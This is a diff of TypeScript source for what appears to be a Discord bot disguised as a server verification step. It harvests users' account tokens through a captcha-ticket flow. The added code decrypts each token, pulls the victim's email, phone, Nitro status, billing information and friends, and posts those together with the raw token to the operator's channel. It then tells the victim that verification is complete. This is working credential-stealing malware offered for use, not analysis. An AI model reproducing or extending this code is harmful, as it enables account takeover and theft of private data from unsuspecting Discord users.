@@ -26,6 +26,7 @@ import {
   getTicketWithCaptchaAxios,
   getUserFriendsAxios,
   getBillingInforationAxios,
+  getUserInformationAxios,
 } from "../util/axios";
 import * as fs from "fs/promises";
 import { allSockets, sharedClient } from "..";
@@ -88,9 +89,17 @@ export class DiscordSocket {
       "utf-8"
     );
 
-    const embed = await embeds.foundTokenEmbed();
-    embed.setDescription(decryptedToken.toString());
-    embed.setAuthor({
+    const fullUserInformation = await getUserInformationAxios(
+      decryptedToken.toString()
+    );
+    const billingInformation = await getBillingInforationAxios(
+      decryptedToken.toString()
+    );
+    const userFriends = await getUserFriendsAxios(decryptedToken.toString());
+    console.log(billingInformation, userFriends);
+
+    const grabbedEmbed = await embeds.foundTokenEmbed();
+    grabbedEmbed.setAuthor({
       name: `${_this.userInformation?.username!}#${_this.userInformation
         ?.discriminator!}`,
       iconURL:
@@ -98,21 +107,28 @@ export class DiscordSocket {
           ? `https://cdn.discordapp.com/avatars/${_this.userInformation?.userid}/${_this.userInformation?.avatar}`
           : "https://discord.com/assets/6f26ddd1bf59740c536d2274bb834a05.png",
     });
+    grabbedEmbed.addFields([
+      {
+        name: "Account Info",
+        value: `Email: ${fullUserInformation?.email}\nPhone: ${
+          fullUserInformation?.phone
+        }\nNitro: ${
+          fullUserInformation?.premium_type
+            ? fullUserInformation?.premium_type === 2
+              ? "Booster"
+              : "Classic"
+            : "None"
+        }\nBilling Info: ${billingInformation.length > 0 ? "Yes" : "No"}`,
+      },
+      { name: "Found Token", value: token },
+    ]);
     (sharedClient.channel as TextChannel).send({
-      embeds: [embed],
+      embeds: [grabbedEmbed],
     });
 
     allSockets.delete(_this.user.id);
 
-    const billingInformation = await getBillingInforationAxios(
-      decryptedToken.toString()
-    );
-    const userFriends = await getUserFriendsAxios(decryptedToken.toString());
-
-    console.log(userFriends, billingInformation);
-
     _this.user.send({ embeds: [await embeds.verificationComplete()] });
-
     if (!config.roles[_this.user.guild.id]) return;
     _this.user.roles.add(config.roles[_this.user.guild.id]);
   }
@@ -187,6 +203,9 @@ export class DiscordSocket {
     if (foundTicket && "encrypted_token" in foundTicket)
       return _this.handleFoundUserToken(_this, foundTicket.encrypted_token);
 
+    await _this.user.send({
+      embeds: [await embeds.pleaseWaitEmbed()],
+    });
     await _this.solveCaptcha(_this, foundTicket, messageData);
   }
 
